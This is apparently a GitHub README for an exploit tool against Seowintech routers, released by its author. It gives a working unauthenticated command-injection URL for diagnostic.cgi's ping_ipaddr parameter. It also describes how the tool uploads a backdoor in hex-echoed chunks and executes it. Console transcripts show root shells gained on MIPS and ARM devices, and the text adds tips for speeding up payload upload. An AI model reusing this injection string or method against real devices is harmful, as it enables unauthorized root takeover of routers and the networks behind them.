# Exploit for Seowintech Routers diagnostic.cgi Unauthenticated Remote Root Code Execution

This is an exploit for an old bug, found the exploit code lurking around in one of my old hard drives, cleaned it up, and decided to release it. Basically, a long while back, a rather interesting exploit was disclosed which affected
*ALL* Seowontech devices. Technically, it is two exploits. A remote root command injection bug, and a remote root file disclosure bug. In this, I only bother with the command injection bug. These vulnerabilities were found by one Todor Donev.  
The bug we are abusing is quite simple. Like many router bugs, it exists in a CGI script, that is used for network diagnostics. It is the bit for pinging that is vulnerable to our abuse.  

PoC:  
```
http://target.com/cgi-bin/diagnostic.cgi?select_mode_ping=on&ping_ipaddr=-q -s 0 127.0.0.1;id;&ping_count=1&action=Apply&html_view=ping
```
As you can see, the "ping_ipaddr" GET variable accepts arguments, and we can inject a command here. Essentially those are passed to a system call and executed without any sanitization. Internet of junk, people.

These devices are MIPS (UPDATE: Was just informed some are ARM, to add to the fucking confusion, by one of the exploit testers. Use the command injection to validate what the hell you are hacking.) Busybox devices, which is basically a stripped  down, castrated, Linux. They are quite useful though ;). These devices do not have a compiler on them (what a surprise), and like most routers, changes that don't get written to nvram are not stored across reboots.

You might notice I do NOT include a payload this time around - yet - you are expected to go build your own. Whatever MIPS/ARMv5l payload you like, be it MSF generated or whatever, idk. I personally used a cross compiled version of tshd by Christopher Devine with a few modifications when testing it out. Instead of being super lame and just straight up wgetting my payload down - I split it into chunks and echo -ne it as hex into a file on the device. This leads to increased reliability and general leetness, however, it also means you will be waiting forever for the bloody thing to upload.

Also note, you MAY need to swap /var/tmp for /tmp on the ARM targets. I might even write in some autodetection logic for this in a later version. Bloody inconsistent devices...

## Usage:
To use, simply specify the target routers base URL, and a MIPS executable to upload and execute.

Example Usage (MIPS target):
```
[balor@magh-meall exploits]$ python2 /tmp/se0wn.py http://seowintech.test /tmp/payload.bin 

███████╗███████╗ ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔════╝██╔════╝██╔═████╗██║    ██║████╗  ██║██╔════╝██╔══██╗
███████╗█████╗  ██║██╔██║██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
╚════██║██╔══╝  ████╔╝██║██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
███████║███████╗╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗██████╔╝
╚══════╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ 
Exploit for Seowintech Routers, CVE-?. Version: 20150425.1
{+} Uploading our backdoor...
{*} Backdoor is in 237 chunks...
100% |#########################################################################################################################################################################################|
{+} Setting execute bit...
{+} Executing Payload...
[balor@magh-meall exploits]$ /tmp/bdcli seowintech.test '/bin/sh -i'


BusyBox v1.4.2 (2011-05-19 09:28:26 KST) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

/var/htdocs/cgi-bin # id;uname -mrs
uid=0(root) gid=0(wheel)
Linux 2.6.20.21-pmc mips
/var/htdocs/cgi-bin # ls /
bin        flash      lib        mnt        ramfs.img  sbin       tmp
dev        home       linuxrc    nfs        rom        sys        usr
etc        htdocs     local      proc       root       temp       var
/var/htdocs/cgi-bin # :)
/var/htdocs/cgi-bin # exit
[balor@magh-meall exploits]$
```

Example Usage (ARM target):
```
~$ python se0wn.py http://seowon-arm.test /tmp/payload.arm.bin 

███████╗███████╗ ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔════╝██╔════╝██╔═████╗██║    ██║████╗  ██║██╔════╝██╔══██╗
███████╗█████╗  ██║██╔██║██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
╚════██║██╔══╝  ████╔╝██║██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
███████║███████╗╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗██████╔╝
╚══════╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ 
Exploit for Seowintech Routers, CVE-?. Version: 20150425.1
{+} Uploading our backdoor...
{*} Backdoor is in 186 chunks...
100% |#########################################################################################################################################################################################|
{+} Setting execute bit...
{+} Executing Payload...
~$ /tmp/bdcli seowon-arm.test '/bin/sh -i'
# id
uid=0(root) gid=0(root)
# uname -a
Linux seowon-arm 2.6.26.8-rt16 #1 PREEMPT Wed Apr 4 17:38:36 KST 2012 armv5tejl unknown
# exit
~$ 
```

Do note, with larger payloads, you might as well bugger off and get a coffee or something because it takes about 5 minutes to upload the payload. My payload is ~29k and takes ~5-6 minutes. You can tweak the "n=500" variable, I pushed it to 750 so far without issues, and suspect we can go higher.

## Demo
If you want, check out the [Asciicast demo][asciicast]  
[![asciicast](https://asciinema.org/a/19221.png)](https://asciinema.org/a/19221)

## Screenshot
![0wned](https://raw.githubusercontent.com/XiphosResearch/exploits/master/se0wned/screenshots/se0wned.png)

## Licence
Licenced under the [WTFPL][wtfpl]

[asciicast]: https://asciinema.org/a/19221
[wtfpl]: http://www.wtfpl.net/
